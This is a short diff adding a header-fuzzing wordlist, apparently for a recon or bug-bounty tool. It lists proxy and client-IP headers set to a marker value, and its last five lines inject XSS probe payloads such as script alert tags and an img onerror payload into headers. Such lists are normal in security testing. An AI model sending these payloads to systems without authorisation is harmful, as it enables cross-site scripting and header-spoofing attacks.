@@ -1,0 +1,25 @@
+X-Forwarded-For: reconx1337
+X-Real-IP: reconx1337
+X-Originating-IP: reconx1337
+X-Remote-IP: reconx1337
+X-Remote-Addr: reconx1337
+X-Client-IP: reconx1337
+X-Host: reconx1337
+X-Forwarded-Host: reconx1337
+Referer: reconx1337
+X-Custom-Header: reconx1337
+X-Forwarded-Server: reconx1337
+X-Original-URL: reconx1337
+X-Rewrite-URL: reconx1337
+True-Client-IP: reconx1337
+CF-Connecting-IP: reconx1337
+Contact: reconx1337
+X-WAP-Profile: reconx1337
+X-Arbitrary: reconx1337
+X-ProxyUser-Ip: reconx1337
+Via: reconx1337
+X-Custom-Header: <script>alert(1)</script>
+X-Forwarded-For: <script>alert(1)</script>
+Referer: <script>alert(1)</script>
+X-Forwarded-Host: <script>alert(1)</script>
+X-Custom-Header: "><img src=x onerror=alert(1)>
